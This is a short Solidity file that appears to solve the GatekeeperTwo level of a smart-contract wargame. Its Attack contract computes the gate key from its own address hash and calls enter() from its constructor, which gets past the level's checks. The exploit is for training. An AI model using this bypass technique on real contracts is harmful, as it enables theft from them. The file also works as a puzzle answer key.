// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {Script, console2} from "forge-std/Script.sol";

import "./Level14.sol";

contract Attack {
    constructor(GatekeeperTwo _instance) {
        bytes8 contractB8 = bytes8(keccak256(abi.encodePacked(address(this))));
        bytes8 key = contractB8 ^ 0xFFFFFFFFFFFFFFFF;

        _instance.enter(key);
    }
}
